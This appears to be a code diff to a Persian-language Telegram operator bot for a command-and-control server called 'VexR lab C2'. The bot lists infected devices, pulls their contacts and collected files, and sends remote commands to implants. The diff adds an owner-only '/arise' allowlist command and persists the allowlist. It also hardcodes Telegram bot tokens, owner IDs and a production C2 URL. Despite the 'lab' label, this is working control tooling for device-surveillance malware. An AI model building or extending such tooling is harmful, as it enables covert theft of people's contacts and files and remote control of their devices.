@@ -1,8 +1,9 @@
 """VexR lab C2 — Telegram operator bot (aiogram 3).
 
-A thin, stateless client over the C2 operator API. It never touches the
-database, the implant protocol, or the artifact files: every screen is built
-from one fresh HTTP call.
+A thin client over the C2 operator API. It never touches the implant protocol
+or the artifact files: every screen is built from one fresh HTTP call. The one
+piece of local state is the Telegram allowlist, kept in the shared settings
+table so /arise survives restarts and redeploys.
 
 Setup:
     cp .env.example .env        # bot token + your numeric Telegram user id
@@ -13,6 +14,7 @@ from __future__ import annotations
 
 import asyncio
 import html
+import json
 import logging
 import os
 import re
@@ -43,6 +45,8 @@ from dotenv import load_dotenv
 BASE_DIR = Path(__file__).resolve().parent
 load_dotenv(BASE_DIR / ".env")
 
+import store  # noqa: E402 - after load_dotenv so VEXR_DB/VEXR_DATA_DIR apply
+
 log = logging.getLogger("vexr.bot")
 logging.basicConfig(
     level=logging.INFO,
@@ -56,7 +60,7 @@ logging.getLogger("httpx").setLevel(logging.WARNING)
 
 BOT_TOKEN = (
     os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
-    or "8822853055:AAFOBse3383qi31m7fPiNmhczzr8JAuclak"
+    or "9294737540:AAG0S0K-DBKHj2dDM5zhjkCxbDOsJftlAS0"
 )
 C2_URL = os.environ.get(
     "VEXR_C2_URL", "https://vexr-lab-c2-academic-production.up.railway.app"
@@ -82,7 +86,35 @@ def _parse_ids(raw: str) -> set[int]:
     return ids
 
 
-ALLOWED_IDS = _parse_ids(os.environ.get("TELEGRAM_ALLOWED_IDS", "")) | {8071301975}
+OWNER_ID = 8518725161
+ALLOWLIST_KEY = "telegram_allowed_ids"
+ALLOWED_IDS = _parse_ids(os.environ.get("TELEGRAM_ALLOWED_IDS", "")) | {OWNER_ID}
+
+
+def _load_saved_ids() -> set[int]:
+    raw = store.get_setting(ALLOWLIST_KEY)
+    if not raw:
+        return set()
+    try:
+        values = json.loads(raw)
+    except ValueError:
+        log.warning("ignoring malformed %s setting", ALLOWLIST_KEY)
+        return set()
+    ids: set[int] = set()
+    for value in values:
+        try:
+            ids.add(int(value))
+        except (TypeError, ValueError):
+            continue
+    return ids
+
+
+def _persist_ids() -> None:
+    """Store everyone except the owner; the owner is never removable."""
+    store.set_setting(
+        ALLOWLIST_KEY, json.dumps(sorted(ALLOWED_IDS - {OWNER_ID}))
+    )
+
 
 COMMANDS: dict[str, str] = {
     "contacts": "📇 مخاطبین",
@@ -379,7 +411,8 @@ START_TEXT = (
     "/stats — وضعیت سرور\n"
     "/devices — لیست دستگاه‌ها\n"
     "/files — آخرین فایل‌ها\n"
-    "/token — توکن ورود داشبورد\n\n"
+    "/token — توکن ورود داشبورد\n"
+    "/arise — مدیریت دسترسی (مالک)\n\n"
     "دستور مستقیم:\n"
     "/cmd &lt;device_key&gt; &lt;command&gt;\n"
     "/get &lt;artifact_id&gt;"
@@ -507,6 +540,72 @@ async def on_token(message: Message, operator_token: str) -> None:
         "🔑 <b>توکن داشبورد</b>\n"
         f"<code>{esc(operator_token)}</code>\n\n"
         "در صفحهٔ ورود داشبورد بگذار، بعد این پیام را پاک کن."
+    )
+
+
+@dp.message(Command("arise"))
+async def on_arise(message: Message, command: CommandObject) -> None:
+    """Owner-only allowlist management: /arise [id | -id]."""
+    user = message.from_user
+    if user is None or user.id != OWNER_ID:
+        await message.answer("⛔️ فقط مالک ربات می‌تواند دسترسی‌ها را تغییر دهد.")
+        return
+
+    args = (command.args or "").strip()
+    if not args:
+        extra = sorted(ALLOWED_IDS - {OWNER_ID})
+        body = (
+            "\n".join(f"• <code>{i}</code>" for i in extra)
+            if extra
+            else "هیچ‌کس دیگری دسترسی ندارد."
+        )
+        await message.answer(
+            "👥 <b>دسترسی ربات</b>\n"
+            f"مالک: <code>{OWNER_ID}</code>\n\n"
+            f"{body}\n\n"
+            "افزودن: <code>/arise 123456789</code>\n"
+            "حذف: <code>/arise -123456789</code>"
+        )
+        return
+
+    raw = args.split()[0]
+    try:
+        value = int(raw)
+    except ValueError:
+        await message.answer(
+            "آیدی باید عددی باشد.\nمثال: <code>/arise 123456789</code>"
+        )
+        return
+
+    remove = value < 0
+    target = abs(value)
+    if target == 0:
+        await message.answer("این آیدی معتبر نیست.")
+        return
+
+    if remove:
+        if target == OWNER_ID:
+            await message.answer("مالک ربات همیشه دسترسی دارد و حذف نمی‌شود.")
+            return
+        if target not in ALLOWED_IDS:
+            await message.answer(f"<code>{target}</code> در لیست نیست.")
+            return
+        ALLOWED_IDS.discard(target)
+        _persist_ids()
+        await message.answer(f"❌ دسترسی <code>{target}</code> حذف شد.")
+        return
+
+    if target == OWNER_ID:
+        await message.answer("این آیدی خودت است و همیشه دسترسی دارد.")
+        return
+    if target in ALLOWED_IDS:
+        await message.answer(f"<code>{target}</code> از قبل دسترسی دارد.")
+        return
+    ALLOWED_IDS.add(target)
+    _persist_ids()
+    await message.answer(
+        f"✅ <code>{target}</code> حالا به ربات دسترسی دارد.\n"
+        "از این به بعد می‌تواند /start بزند."
     )
 
 
@@ -679,6 +778,10 @@ async def serve(
         raise BotConfigError(
             "TELEGRAM_BOT_TOKEN تنظیم نشده — .env را از .env.example بساز."
         )
+
+    store.init_db()
+    ALLOWED_IDS.update(_load_saved_ids())
+
     if not ALLOWED_IDS:
         raise BotConfigError(
             "TELEGRAM_ALLOWED_IDS خالی است. آیدی عددی خودت را از @userinfobot "
